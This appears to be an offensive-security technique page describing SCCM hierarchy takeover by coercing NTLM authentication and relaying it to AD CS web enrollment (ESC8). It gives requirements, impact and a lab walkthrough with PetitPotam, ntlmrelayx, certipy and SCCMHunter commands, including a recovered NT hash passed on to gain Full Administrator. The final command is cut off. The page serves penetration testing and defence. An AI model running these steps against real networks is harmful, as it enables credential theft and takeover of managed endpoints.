# TAKEOVER-3

## Description
Hierarchy takeover via NTLM coercion and relay to HTTP on AD CS

## MITRE ATT&CK TTPs
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement

## Requirements
### Coercion
- Valid Active Directory domain credentials
- Connectivity to SMB (TCP/445) on a coercion target:
    - TAKEOVER-3.1: Coerce primary site server
    - TAKEOVER-3.2: Coerce SMS Provider
    - TAKEOVER-3.3: Coerce passive site server
    - TAKEOVER-3.4: Coerce site database server
- Connectivity from the coercion target to SMB (TCP/445) on the relay server (or WebClient enabled and connectivity via any port)
- Coercion target settings:
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server [DEFAULT]
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and  `ClientAllowedNTLMServers` contains attacker relay server [DEFAULT]
    - Domain computer account is not in `Protected Users` [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target [DEFAULT]

### Relay
- Either of the following AD CS services is in use:
    - Certificate Authority Web Enrollment [NON-DEFAULT]
    - Certificate Enrollment Web Service [NON-DEFAULT]
- Connectivity from the relay server to HTTPS (TCP/443) on the relay target hosting the AD CS service
- Extended protection for authentication is not required by the target AD CS service [DEFAULT]
- An enabled AD CS template that allows enrollment and supports authentication
- Relay target settings:
    - `RestrictReceivingNTLMTraffic` = `0` or not present [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target [DEFAULT]
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target [DEFAULT]

## Summary
When available, SCCM uses public key infrastructure (PKI) for authentication and authorization. While not required, administrators may choose to deploy Active Directory Certificate Services (AD CS) to support SCCM's [various certificate requirements](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/security/plan-for-certificates) rather than use self-signed certificates. AD CS is home to its own [misconfigurations](https://posts.specterops.io/certified-pre-owned-d95910965cd2); particularly ESC8. In short, the [certificate enrollment web interface](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831649(v=ws.11)) is vulnerable to NTLM relaying. An attacker may coerce NTLM authentication from a coercion target and relay to the AD CS enrollment web service to enroll in and acquire a valid certificate template on behalf of the target. The template can then be used to escalate to "Full Administrator" in SCCM by impersonating the coerced target.

## Impact
The "Full Administrator" security role is granted all permissions in Configuration Manager for all scopes and all collections. An attacker with this privilege can execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on. They can also leverage tools such as CMPivot and Run Script to query or execute scripts on client devices in real-time using the AdminService or WMI on an SMS Provider.

- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)

## Subtechniques
- TAKEOVER-3.1: Coerce primary site server
- TAKEOVER-3.2: Coerce SMS Provider
- TAKEOVER-3.3: Coerce passive site server
- TAKEOVER-3.4: Coerce site database server

## Examples
The steps to execute TAKEOVER-3.1 through TAKEOVER-3.4 are the same except that a different system is targeted for coercion of NTLM authentication. The following example assumes the AD CS service has been previously enumerated and the web enrollment form is vulnerable to ESC8.

1. Use `SCCMHunter` to  profile SCCM infrastructure:

    ```
    [12:24:25 AM] INFO     [+] Finished profiling all discovered computers.
    [12:24:25 AM] INFO     +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+

                        +=========================+============+=================+==============+===================+=====================+===============+========+=========+

                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                        | sccm.internal.lab       | LAB        | False           | True         | True              | False               | True          | False  | False   |
                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
    ```

2. On the attacker relay server, start `ntlmrelayx`, targeting the URL of the certificate enrollment web interface on the certificate authority:

    ```
    └─# ntlmrelayx.py -t http://ca.internal.lab/certsrv/certfnsh.asp --adcs -smb2support
    Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra

    [*] Setting up RAW Server on port 6666

    [*] Servers started, waiting for connections
    ```

3. From the attacker host, coerce NTLM authentication from the site server via SMB, targeting the relay server's IP address:

    ```
    ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP>

    Trying pipe lsarpc
    [-] Connecting to ncacn_np:10.10.100.121[\PIPE\lsarpc]
    [+] Connected!

    [+] Successfully bound!

    [+] OK! Using unpatched function!
    [-] Sending EfsRpcEncryptFileSrv!
    [+] Got expected ERROR_BAD_NETPATH exception!!
    [+] Attack worked!
    ```

    After a few seconds, you should receive an SMB connection on the relay server that is forwarded to the cert enrollment service to request a certificate for the coercion target:

    ```
    [*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.100.9, attacking target http://ca.internal.lab
    [*] HTTP server returned error code 200, treating as a successful login
    [*] Authenticating against http://ca.internal.lab as LAB/SCCM$ SUCCEED
    [*] SMBD-Thread-7 (process_request_thread): Connection from 10.10.100.9 controlled, but there are no more targets left!
    [*] Generating CSR...

    ```

4. Use `certipy` to recover the coerced target's NT hash:

    ```
    └─# certipy auth -pfx sccm.pfx
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [*] Using principal: sccm$@internal.lab
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Saved credential cache to 'sccm.ccache'
    [*] Trying to retrieve NT hash for 'sccm$'
    [*] Got hash for 'sccm$@internal.lab': aad3b435b51404eeaad3b435b51404ee:075f745ec2daeb97c87b30d1d394f28b
    ```

5. Use `SCCMHunter` to authenticate to an SMS Provider as the site server and grant a user the Full Administrator role:

```
└─# python3 sccmhunter.py admin -u sccm\$ -p aad3b435b51404eeaad3b435b51404ee:075f745ec2daeb97c87b30d1d394f28b -ip 10.10.100.9
